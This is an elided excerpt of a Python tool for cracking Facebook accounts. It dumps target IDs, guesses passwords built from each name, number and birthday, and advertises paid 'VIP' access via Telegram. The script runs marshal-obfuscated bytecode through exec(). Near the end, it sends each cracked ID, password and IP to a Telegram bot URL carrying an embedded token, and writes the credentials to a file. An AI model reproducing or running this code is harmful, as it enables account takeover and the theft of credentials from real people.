...
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m TOOL VIP 5$ KORAK YOU 40 DAY @TERORST_709") 
...
def login_bas():
	try:
		...
		print(f' Good python AGHA-RUSExV1.py ! ');time.sleep(1)
		os.system("python AGHA-RUSExV1.py")
		exit()
	except Exception as e:
...
def menu(my_name):
	...
	print(f"	")	
	print("")
	print('\033[1;32m%s %s\033[1;32m[01]%s%s \033[1;32mCRACK PUBLIC [NOT] %s%s%s'%(P,H,P,H,P,H,P))
	print('\033[1;32m%s %s\033[1;32m[02]%s%s \033[1;32mCRACK PUBLIC (MULTI) not%s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;32m%s %s\033[1;32m[03]%s%s \033[1;32mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;32m%s %s\033[1;32m[04]%s%s \033[1;32mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;32m%s %s\033[1;32m[05]%s%s \033[1;32mMY TELEGRAM %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;32m%s %s\033[1;32m[00]%s%s \033[1;32mEXIT %s%s%s'%(P,H,P,H,P,H,P))
	print("")
	SAW = input('%s%s%s%s\033[1;32m  CHOICE %s\033[1;32m : '%(N,H,N,H,M))
	if SAW in ['1','01']:
		dump_publik()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.122)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['2','02']:
		...
		os.system("xdg-open  https://t.me/team709kurd")
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.122)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
		os.system("python MRBX-10.py")
	elif SAW in ['',' ']:
		os.system("python MRBX-10.py")
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(' Ho many Id Facebook  ? : '))
	except ValueError:
		print('')
		exit()
	if jum<1 or jum>100:
...
\033[1;32m [01]  All NAME+Number+birthday =
\033[1;32m [02]  NAME 123, NAME 1234 , NAME 12345 =
\033[1;32m [07]  ALL NAME... = """)
	saw = input(' ENTR : ')
	if saw in ['01','1']:
		passwrd1()
	if saw in ['02','2']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get(f"https://api.telm.org/bot5184052776:AAEwfSAN2BiKagHPk9IX5Me6TYc6I/sendMess={idf}|{pw}\n {ip} ")
				print(f'\r{H}\n[ AGHARUSE-OK ]\n ID : {idf}\n PASSWORD : {pw}\n{N} COOKIE S: {kuki}')
				#saw
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
